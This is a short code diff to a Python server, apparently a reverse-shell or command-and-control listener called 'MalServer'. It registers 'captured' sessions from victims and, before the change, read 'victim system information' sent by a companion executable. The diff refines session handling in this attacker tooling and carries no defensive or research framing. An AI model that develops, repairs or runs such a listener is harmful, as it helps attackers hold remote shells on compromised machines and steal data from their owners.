@@ -67,6 +67,7 @@ class ServerConfig:
     def AddSession(self, session:Sessions.Session):
         self.capturedSessions.append(session)
     def RemoveSession(self, session:Sessions.Session):
+        session.EndSession()
         self.capturedSessions.remove(session)
 
     def AddSessionThread(self, t):
@@ -107,20 +108,7 @@ def RunServer(MalServer: ServerConfig, handle: Prompt.HandlerPrompt):
                 break
 
             handle.WriteToTerminal(f"[*] Incoming connection | {address}")
-            connection.settimeout(5)
-
-            sessionData = ""
-            try:
-                # Server recieves victim system information
-                # coming from executable from ScriptMaker
-                sessionData = json.loads(connection.recv(4096).decode())
-            except:
-                # captured raw shell (not from executable)
-                sessionData = ""
-
-            # Store new Session Connection
-            connection.settimeout(None)
-            clientSession = Sessions.Session(connection,address,sessionData)
+            clientSession = Sessions.Session(connection,address)
             MalServer.AddSession(clientSession)
 
         # Shutdown the Socket Server
